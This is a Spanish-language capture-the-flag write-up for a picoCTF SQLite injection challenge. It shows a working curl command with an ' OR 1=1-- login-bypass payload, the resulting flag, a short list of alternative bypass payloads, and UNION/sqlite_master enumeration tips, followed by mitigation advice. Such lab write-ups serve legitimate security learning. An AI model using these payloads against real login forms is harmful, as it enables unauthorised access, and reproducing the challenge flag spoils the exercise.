# MoreSQLi

## Descripción

Reto de SQL Injection usando SQLite. Hay un formulario de login vulnerable en la URL base; explotando la inyección es posible hacer bypass y obtener la bandera.

URL del reto: `http://saturn.picoctf.net:63488`

## Solución

La aplicación construye una consulta SQL sin sanear los parámetros `username` y `password`. Inyectando en el campo `password` una expresión que cierre la comilla y agregue una condición siempre verdadera, y usando `--` para comentar el resto de la sentencia, se produce un bypass de autenticación.

Comando reproducible que funcionó durante la prueba:

```bash
curl -s -i -X POST -d "username=foo&password=' OR 1=1--" http://saturn.picoctf.net:63488 | sed -n '1,120p'
```

Salida (extracto):

```
HTTP/1.1 302 Found
location: welcome.php
<h1>Logged in!.</h1>
<p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}</p>
```

Alternativas de payloads comunes (pueden variar según cómo la app construya la consulta):

- `admin' OR '1'='1' -- `
- `' OR 1=1--` (como se usó aquí)
- `admin'--` o `admin' #` (comentarios según el motor SQL)

## Notas

- El reto usa SQLite; las técnicas de UNION/PRAGMA pueden ser útiles para enumerar tablas si el bypass no devuelve la bandera directamente.
- Si necesita enumerar tablas/columnas: probar payloads `UNION SELECT` o consultar `sqlite_master` para listar `tbl_name` y `sql`.
- En aplicaciones reales, mitigar con consultas preparadas (prepared statements), validación y escaping, y minimizar privilegios de la cuenta DB.

## Referencias

- SQLite Injection (PayloadsAllTheThings): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
- SQLi cheat sheet (PortSwigger): https://portswigger.net/web-security/sql-injection/cheat-sheet
